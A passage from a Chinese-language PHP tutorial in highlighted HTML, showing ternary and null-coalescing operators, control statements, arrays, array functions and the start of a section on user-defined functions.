class="number">65</span>) ? <span class="string">&quot;Senior&quot;</span> : (<span class="variable">$isStudent</span> ? <span class="string">&quot;Student&quot;</span> : <span class="string">&quot;Regular&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Discount: &quot;</span> . <span class="variable">$discount</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// &quot;Student&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空合并运算符 (PHP 7+)</span></span><br><span class="line"><span class="variable">$username</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$displayName</span> = <span class="variable">$username</span> ?? <span class="string">&quot;Guest&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Display name: &quot;</span> . <span class="variable">$displayName</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// &quot;Guest&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 短路三元运算符 (PHP 7.4+)</span></span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$permission</span> = <span class="variable">$role</span> === <span class="string">&quot;admin&quot;</span> ? <span class="string">&quot;Full access&quot;</span> : (<span class="variable">$role</span> === <span class="string">&quot;editor&quot;</span> ? <span class="string">&quot;Edit access&quot;</span> : <span class="string">&quot;View only&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Permission: &quot;</span> . <span class="variable">$permission</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// &quot;Full access&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-控制语句"><a href="#5-控制语句" class="headerlink" title="5. 控制语句"></a>5. 控制语句</h2><h3 id="详细解释-4"><a href="#详细解释-4" class="headerlink" title="详细解释"></a>详细解释</h3><p>控制语句用于控制程序的执行流程。</p>
<h3 id="主要控制语句："><a href="#主要控制语句：" class="headerlink" title="主要控制语句："></a>主要控制语句：</h3><ul>
<li><strong>条件语句</strong>：<code>if</code>, <code>if...else</code>, <code>if...elseif...else</code>, <code>switch</code></li>
<li><strong>循环语句</strong>：<code>while</code>, <code>do...while</code>, <code>for</code>, <code>foreach</code></li>
<li><strong>流程控制语句</strong>：<code>break</code>, <code>continue</code>, <code>return</code>, <code>exit</code></li>
</ul>
<h3 id="5-1-条件语句"><a href="#5-1-条件语句" class="headerlink" title="5.1 条件语句"></a>5.1 条件语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$score</span> = <span class="number">85</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if语句</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$score</span> &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Excellent!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if...else语句</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$score</span> &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Passed!\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Failed!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if...elseif...else语句</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$score</span> &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;A - Excellent!\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$score</span> &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;B - Good!\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$score</span> &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;C - Satisfactory!\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$score</span> &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;D - Needs improvement!\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;F - Failed!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch语句</span></span><br><span class="line"><span class="variable">$day</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;l&quot;</span>); <span class="comment">// 获取当前星期</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$day</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Monday&quot;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Start of the work week.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Tuesday&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Wednesday&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Thursday&quot;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Midweek.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Friday&quot;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;End of the work week.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Saturday&quot;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Sunday&quot;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Weekend!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Unknown day.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-2-循环语句"><a href="#5-2-循环语句" class="headerlink" title="5.2 循环语句"></a>5.2 循环语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// while循环</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;While loop: <span class="subst">$i</span>\n&quot;</span>;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// do...while循环</span></span><br><span class="line"><span class="variable">$j</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Do...while loop: <span class="subst">$j</span>\n&quot;</span>;</span><br><span class="line">    <span class="variable">$j</span>++;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="variable">$j</span> &lt;= <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// for循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">1</span>; <span class="variable">$k</span> &lt;= <span class="number">5</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;For loop: <span class="subst">$k</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foreach循环（数组）</span></span><br><span class="line"><span class="variable">$colors</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$colors</span> <span class="keyword">as</span> <span class="variable">$color</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Color: <span class="subst">$color</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foreach循环（关联数组）</span></span><br><span class="line"><span class="variable">$person</span> = [</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$person</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Person <span class="subst">$key</span>: <span class="subst">$value</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-3-流程控制语句"><a href="#5-3-流程控制语句" class="headerlink" title="5.3 流程控制语句"></a>5.3 流程控制语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// break语句</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 退出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Break example: <span class="subst">$i</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// continue语句</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">// 跳过本次迭代</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Continue example: <span class="subst">$i</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// return语句（在函数中）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getGreeting</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, Guest!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getGreeting</span>(<span class="string">&quot;Alice&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getGreeting</span>(<span class="string">&quot; &quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exit语句</span></span><br><span class="line"><span class="variable">$shouldExit</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$shouldExit</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Exiting...\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed if shouldExit is false.\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="6-PHP数组"><a href="#6-PHP数组" class="headerlink" title="6. PHP数组"></a>6. PHP数组</h2><h3 id="详细解释-5"><a href="#详细解释-5" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP数组是一种有序映射，可以存储多个值。</p>
<h3 id="数组类型："><a href="#数组类型：" class="headerlink" title="数组类型："></a>数组类型：</h3><ul>
<li><strong>索引数组</strong>：数字键名</li>
<li><strong>关联数组</strong>：字符串键名</li>
<li><strong>多维数组</strong>：数组中包含数组</li>
</ul>
<h3 id="数组操作："><a href="#数组操作：" class="headerlink" title="数组操作："></a>数组操作：</h3><ul>
<li>创建数组</li>
<li>添加元素</li>
<li>删除元素</li>
<li>遍历数组</li>
<li>数组排序</li>
<li>数组函数</li>
</ul>
<h3 id="6-1-数组的创建与操作"><a href="#6-1-数组的创建与操作" class="headerlink" title="6.1 数组的创建与操作"></a>6.1 数组的创建与操作</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建索引数组</span></span><br><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>);</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="variable">$fruits</span> = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建关联数组</span></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="variable">$person</span> = [</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;New York&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建多维数组</span></span><br><span class="line"><span class="variable">$students</span> = [</span><br><span class="line">    [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">1</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="number">20</span>],</span><br><span class="line">    [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">2</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="number">22</span>],</span><br><span class="line">    [<span class="string">&quot;id&quot;</span> =&gt; <span class="number">3</span>, <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Charlie&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="number">21</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问数组元素</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;First fruit: &quot;</span> . <span class="variable">$fruits</span>[<span class="number">0</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Person name: &quot;</span> . <span class="variable">$person</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Second student name: &quot;</span> . <span class="variable">$students</span>[<span class="number">1</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改数组元素</span></span><br><span class="line"><span class="variable">$fruits</span>[<span class="number">1</span>] = <span class="string">&quot;Blueberry&quot;</span>;</span><br><span class="line"><span class="variable">$person</span>[<span class="string">&quot;age&quot;</span>] = <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line"><span class="variable">$fruits</span>[] = <span class="string">&quot;Date&quot;</span>; <span class="comment">// 添加到末尾</span></span><br><span class="line"><span class="variable">$person</span>[<span class="string">&quot;email&quot;</span>] = <span class="string">&quot;john@example.com&quot;</span>; <span class="comment">// 添加新键值对</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$fruits</span>[<span class="number">0</span>]); <span class="comment">// 删除索引0的元素</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$person</span>[<span class="string">&quot;city&quot;</span>]); <span class="comment">// 删除&quot;city&quot;键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查元素是否存在</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fruit &#x27;Banana&#x27; exists: &quot;</span> . (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;Banana&quot;</span>, <span class="variable">$fruits</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Key &#x27;email&#x27; exists: &quot;</span> . (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;email&quot;</span>, <span class="variable">$person</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组长度</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Number of fruits: &quot;</span> . <span class="title function_ invoke__">count</span>(<span class="variable">$fruits</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="6-2-数组函数"><a href="#6-2-数组函数" class="headerlink" title="6.2 数组函数"></a>6.2 数组函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 排序函数</span></span><br><span class="line"><span class="variable">$sorted</span> = <span class="variable">$numbers</span>;</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$sorted</span>); <span class="comment">// 升序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorted: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$sorted</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sorted</span> = <span class="variable">$numbers</span>;</span><br><span class="line"><span class="title function_ invoke__">rsort</span>(<span class="variable">$sorted</span>); <span class="comment">// 降序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Reverse sorted: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$sorted</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关联数组排序</span></span><br><span class="line"><span class="variable">$ages</span> = [</span><br><span class="line">    <span class="string">&quot;Alice&quot;</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">&quot;Bob&quot;</span> =&gt; <span class="number">22</span>,</span><br><span class="line">    <span class="string">&quot;Charlie&quot;</span> =&gt; <span class="number">21</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_ invoke__">asort</span>(<span class="variable">$ages</span>); <span class="comment">// 按值排序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Ages sorted by value: &quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ages</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$age</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$name</span>(<span class="subst">$age</span>), &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ksort</span>(<span class="variable">$ages</span>); <span class="comment">// 按键排序</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Ages sorted by key: &quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ages</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$age</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$name</span>(<span class="subst">$age</span>), &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组操作函数</span></span><br><span class="line"><span class="variable">$colors</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$colors</span>, <span class="string">&quot;yellow&quot;</span>); <span class="comment">// 添加到末尾</span></span><br><span class="line"><span class="title function_ invoke__">array_unshift</span>(<span class="variable">$colors</span>, <span class="string">&quot;purple&quot;</span>); <span class="comment">// 添加到开头</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After push and unshift: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$colors</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$last</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$colors</span>); <span class="comment">// 移除末尾元素</span></span><br><span class="line"><span class="variable">$first</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$colors</span>); <span class="comment">// 移除开头元素</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After pop and shift: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$colors</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组切片</span></span><br><span class="line"><span class="variable">$subset</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$colors</span>, <span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 从索引1开始，取2个元素</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Array slice: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$subset</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组映射</span></span><br><span class="line"><span class="variable">$squared</span> = <span class="title function_ invoke__">array_map</span>(function(<span class="variable">$n</span>) &#123; <span class="keyword">return</span> <span class="variable">$n</span> * <span class="variable">$n</span>; &#125;, <span class="variable">$numbers</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Squared numbers: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$squared</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组过滤</span></span><br><span class="line"><span class="variable">$even</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$numbers</span>, function(<span class="variable">$n</span>) &#123; <span class="keyword">return</span> <span class="variable">$n</span> % <span class="number">2</span> == <span class="number">0</span>; &#125;);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Even numbers: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$even</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组合并</span></span><br><span class="line"><span class="variable">$colors1</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>];</span><br><span class="line"><span class="variable">$colors2</span> = [<span class="string">&quot;blue&quot;</span>, <span class="string">&quot;yellow&quot;</span>];</span><br><span class="line"><span class="variable">$allColors</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$colors1</span>, <span class="variable">$colors2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Merged colors: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$allColors</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="7-PHP-函数"><a href="#7-PHP-函数" class="headerlink" title="7. PHP 函数"></a>7. PHP 函数</h2><h3 id="详细解释-6"><a href="#详细解释-6" class="headerlink" title="详细解释"></a>详细解释</h3><p>函数是可重用的代码块，用于执行特定任务。</p>
<h3 id="函数特点："><a href="#函数特点：" class="headerlink" title="函数特点："></a>函数特点：</h3><ul>
<li>可以接受参数</li>
<li>可以返回值</li>
<li>可以有默认参数</li>
<li>可以有类型声明（PHP 7+）</li>
<li>支持可变参数（PHP 5.6+）</li>
</ul>
<h3 id="函数类型："><a href="#函数类型：" class="headerlink" title="函数类型："></a>函数类型：</h3><ul>
<li><strong>用户定义函数</strong>：开发者创建的函数</li>
<li><strong>内置函数</strong>：PHP自带的函数</li>
<li><strong>匿名函数</strong>：没有名称的函数</li>
</ul>
<h3 id="7-1-函数定义与调用"><a href="#7-1-函数定义与调用" class="headerlink" title="7.1 函数定义与调用"></a>7.1 函数定义与调用</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 基本函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">greet</span>(<span class="string">&quot;Alice&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带默认参数的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&quot;Guest&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sayHello</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sayHello</span>(<span class="string">&quot;Bob&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回多个值（通过数组）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPerson</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Charlie&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">        <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;London&quot;</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$person</span> = <span class="title function_ invoke__">getPerson</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Person name: &quot;</span> . <span class="variable">$person</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型声明（PHP 7+）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$a</span>, <span class="keyword">int</span> <span class="variable">$b</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 + 3 = &quot;</span> . <span class="title function_ invoke__">add</span>(<span class="number">5</span>, <span class="number">3</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变参数（PHP 5.6+）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">...<span class="variable">$numbers</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_sum</span>(<span class="variable">$numbers</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sum: &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名函数</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hi, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span 